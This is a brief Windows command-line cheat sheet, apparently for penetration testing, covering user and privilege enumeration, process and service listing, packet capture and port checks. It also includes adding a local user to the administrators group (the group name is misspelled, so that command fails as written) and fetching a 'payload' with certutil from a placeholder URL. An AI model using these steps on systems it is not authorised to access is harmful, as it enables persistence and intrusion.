# list local users
```
net user
```
# Get current user info
```
whoami
whoami /groups
whoami /priv
```
# Add users (local)
```
net user /add <username> <password>
net localgroup Administartors <username> /add
```
# See Running Processes
```
tasklist
wmic process
```
# Kill a process
```
taskkill /PID <process_id> /F
```
# See Running Services
```
net start
sc query
wmic service get
```
# Capture Packets
```
netsh trace start persistent=yes capture=yes tracefile=<path/filename>.etl
netsh trace stop
```
# Download a payload
```
certutil -urlcache -split -f "https://<url>.zip" <filename>.zip
```
# Check for Open Ports (Powershell)

```
tnc \\computer.domain -Port 80
tnc 10.0.0.1 -Port 443
```
``# 
